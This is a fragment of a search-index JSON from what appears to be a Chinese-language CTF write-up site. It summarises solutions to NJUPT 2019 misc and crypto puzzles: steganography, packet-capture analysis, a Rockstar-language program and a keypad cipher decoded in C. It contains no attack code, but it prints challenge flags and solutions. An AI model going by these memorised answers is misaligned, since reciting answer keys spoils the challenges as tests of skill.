\u4e2d\u95f4\u6709\u4e00\u4e32\u4e0d\u77e5\u6240\u4e91\u7684\u5b57\u7b26\u4e32\u3002 \u76f4\u63a5base64\u89e3\u5bc6\u5c31\u53ef\u4ee5\u4e86","title":"PiP2 install"},{"location":"writeup/NJUPT-2019/#a_good_idea","text":"\u4e00\u5f20\u56fe\u7247\u3002\u60f3\u90fd\u4e0d\u8981\u60f3\u76f4\u63a5binwalk [\u56fe\u7247] \u6709\u4e24\u5f20\u56fe\u7247\uff0chint\u662f\u5bfb\u627e\u50cf\u7d20\u7684\u79d8\u5bc6\u3002 \u90a3\u5c31stegsolve\u4e00\u4e0bcombine\u4e24\u5f20\u56fe\u7247\u7136\u540e\u5de6\u53f3\u5207\u6362\u901a\u9053\u4e00\u6b21\u5c31\u5f97\u5230\u4e8c\u7ef4\u7801\u4e86 \u626b\u63cf\u5373\u53ef","title":"a_good_idea"},{"location":"writeup/NJUPT-2019/#whats-this","text":"\u6d41\u91cf\u5206\u6790\u76f4\u63a5\u770bhttp\u534f\u8bae\u3002\u5168\u90e8\u5bfc\u51fa\u540e\u5f97\u5230\u6709\u4e00\u4e2azip\u6587\u4ef6\u5305\u91cc\u9762\u5305\u542b\u4e86\u4e00\u4e2awhat 1s th1s .txt\u91cc\u9762\u683c\u5f0f\u4e0ebase64\u9690\u5199\u5f88\u50cf\u76f4\u63a5py\u8fd0\u884c [\u56fe\u7247]","title":"what`s this"},{"location":"writeup/NJUPT-2019/#become-a-rockstar","text":"\u4e0b\u8f7d\u5f97\u5230\u4e00\u4e2arock\u6587\u4ef6 \u4e00\u756a~~\u767e\u5ea6~~Bing\u540e\u4e86\u89e3\u5230Rockstar\u8fd9\u4e2a\u7f16\u7a0b\u8bed\u8a00 https://github.com/RockstarLang/rockstar https://github.com/yyyyyyyyyyan/rockstar-py \u4f7f\u7528rockstar-py rockstar-py Become_a_Rockstar.rock \u5f97\u5230\u4e00\u6bb5python\u4ee3\u7801 Leonard_Adleman = \"star\" Problem_Makers = 76 Problem_Makers = \"NCTF{\" def God(World): a_boy = \"flag\" the_boy = 3 def Evil(your_mind): a_girl = \"no flag\" the_girl = 5 Truths = 3694 Bob = \"ar\" Adi_Shamir = \"rock\" def Love(Alice, Bob): Mallory = 13 Mallory = 24 Everything = 114514 Alice = \"you\" def Reality(God, Evil): God = 26 Evil = 235 Ron_Rivest = \"nice\" def You_Want_To(Alice, Love, Anything): You = 5.75428 your_heart = input() You = 5 your_mind = input() Nothing = 31 if Truths * Nothing == Everything: RSA = Ron_Rivest + Adi_Shamir + Leonard_Adleman if Everything / Nothing == Truths: Problem_Makers = Problem_Makers + Alice + Bob print(Problem_Makers) the_flag = 245 the_confusion = 244 print(RSA) Mysterious_One = \"}\" print(Mysterious_One) This = 4 This = 35 This = 7 This = 3 This = 3 This = 37 \u8dd1\u4e00\u4e0bflag\u5c31\u51fa\u6765\u4e86 NCTF{youarnicerockstar}","title":"Become a Rockstar"},{"location":"writeup/NJUPT-2019/#_3","text":"\u53c8\u4e00\u4e2a\u6d41\u91cf\u5206\u6790\u76f4\u63a5\u5bfchttp\u53d1\u73b0\u5305\u91cc\u5b58\u5728\u4e00\u4e2a1.html\u6253\u5f00\u90fd\u662f \u76f4\u63a5\u8f6ctxt\u731c\u6d4b\u662f\u56fe\u7247RGB \u5229\u7528python\u811a\u672c\u8f6c\u6210\u56fe\u7247\u53ef\u6700\u7ec8\u5f97\u5230flag.","title":"\u5c0f\u72d7\u7684\u79d8\u5bc6"},{"location":"writeup/NJUPT-2019/#2077","text":"\u76f4\u63a5 Google Cyberpunk 2077 stream decode. \u7136\u540e\u5728\u4e00\u4e2a reddit \u5e16\u5b50 \u4e2d\uff0c\u627e\u5230\u56fe\u7247\u4e0b\u8f7d\u5730\u5740\u3002\u4e0b\u8f7d\u540e\u7528 sha256sum \u6c42 sha256 \u503c\u5373\u53ef\u3002","title":"2077"},{"location":"writeup/NJUPT-2019/#crypto","text":"","title":"Crypto"},{"location":"writeup/NJUPT-2019/#keyboard","text":"\u770b\u5230\u8fd9\u91cc\u603b\u5171\u67098\u4e2a\u5b57\u6bcd\uff0c\u6700\u591a\u91cd\u590d\u4e864\u6b21\uff0c\u89c9\u5f97\u5c31\u5bf9\u5e94\u4e86\u624b\u673a\u952e\u76d8\u4e2d\u7684\u4e5d\u5bab\u8f93\u5165\u6cd5\uff0c\u53bb\u624b\u8bd5\u4e86\u8bd5\uff0c\u524d\u9762\u5c31\u51fa\u6765\u4e86youare\uff0c\u4e8e\u662f\u5199\u4e86\u4e2a\u7a0b\u5e8f\u7801\u4e86\u51fa\u6765 #include <cstdio> #include <cstring> char a[100][5]={\"ooo\",\"yyy\",\"ii\",\"w\",\"uuu\",\"ee\",\"uuuu\",\"yyy\",\"uuuu\",\"y\",\"w\",\"uuu\",\"i\",\"i\",\"rr\",\"w\",\"i\",\"i\",\"rr\",\"rrr\",\"uuuu\",\"rrr\",\"uuuu\",\"t\",\"ii\",\"uuuu\",\"i\",\"w\",\"u\",\"rrr\",\"ee\",\"www\",\"ee\",\"yyy\",\"eee\",\"www\",\"w\",\"tt\",\"ee\"}; char b[100][5]={\"w\",\"ww\",\"www\",\"e\",\"ee\",\"eee\",\"r\",\"rr\",\"rrr\",\"t\",\"tt\",\"ttt\",\"y\",\"yy\",\"yyy\",\"u\",\"uu\",\"uuu\",\"uuuu\",\"i\",\"ii\",\"iii\",\"o\",\"oo\",\"ooo\",\"oooo\"}; char c[27]=\"abcdefghijklmnopqrstuvwxyz\"; int main() { for(int i=0;i<=38;++i) { for(int j=0;j<=25;++j) { if(strcmp(a[i],b[j])==0) { printf(\"%c\",c[j]); break; } } } return 0; } youaresosmartthatthisisjustapieceofcake","title":"keyboard"}]}